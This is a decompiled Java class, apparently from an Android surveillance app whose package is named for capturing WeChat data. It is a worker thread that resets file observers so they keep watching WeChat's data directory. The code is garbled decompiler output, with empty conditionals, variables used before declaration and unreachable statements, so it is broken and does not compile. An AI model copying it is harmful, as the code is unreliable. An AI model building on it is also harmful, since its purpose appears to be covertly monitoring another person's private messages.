package com.vvt.capture.wechat.a;

import android.os.SystemClock;

import com.vvt.capture.wechat.a;

class h
  implements Runnable
{
  h(a.FxFileObserverWorker paramg) {}
  
  public void run()
  {
    bool1 = b.a();
    if (bool1) {}
    long l = 3000L;
    SystemClock.sleep(l);
    for (;;)
    {
      try
      {
        localObject1 = com.vvt.capture.wechat.b.a();
        bool2 = b.a();
        if (bool2) {}
        bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2)
        {
          localObject3 = b.d();
          bool2 = com.vvt.ag.b.a((String)localObject3);
          if (!bool2) {
            continue;
          }
        }
        bool1 = b.a();
        if (bool1) {}
        localObject1 = this.a;
      }
      catch (Exception localException)
      {
        Object localObject1;
        boolean bool2;
        Object localObject3;
        bool1 = b.c();
        if (!bool1) {
          continue;
        }
        a.FxFileObserverWorker localg = this.a;
        continue;
      }
      finally
      {
        a.FxFileObserverWorker.a(this.a, null);
      }
      a.FxFileObserverWorker.a((a.FxFileObserverWorker)localObject1, null);
      return;
      localObject3 = b.d();
      bool2 = ((String)localObject1).equalsIgnoreCase((String)localObject3);
      if (bool2)
      {
        bool1 = b.a();
        if (!bool1) {}
      }
      else
      {
        bool2 = b.a();
        if (bool2) {}
        localObject3 = this.a;
        localObject3 = ((a.FxFileObserverWorker)localObject3).a;
        localObject3 = b.b((b)localObject3);
        if (localObject3 != null)
        {
          localObject3 = this.a;
          localObject3 = ((com.vvt.capture.wechat.a.FxFileObserverWorker)localObject3).a;
          localObject3 = b.b((b)localObject3);
          ((d)localObject3).stopWatching();
          localObject3 = this.a;
          localObject3 = ((a.FxFileObserverWorker)localObject3).a;
          b.a((b)localObject3, null);
        }
        localObject3 = this.a;
        localObject3 = ((a.FxFileObserverWorker)localObject3).a;
        localObject3 = b.c((b)localObject3);
        if (localObject3 != null)
        {
          localObject3 = this.a;
          localObject3 = ((a.FxFileObserverWorker)localObject3).a;
          localObject3 = b.c((b)localObject3);
          ((a.FxFileObserverWorker)localObject3).stopWatching();
          localObject3 = this.a;
          localObject3 = ((a.FxFileObserverWorker)localObject3).a;
          b.a((b)localObject3, null);
        }
        localObject3 = this.a;
        localObject3 = ((a.FxFileObserverWorker)localObject3).a;
        b.b((b)localObject3, (String)localObject1);
        localObject1 = this.a;
        localObject1 = ((a.FxFileObserverWorker)localObject1).a;
        b.d((b)localObject1);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/a/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */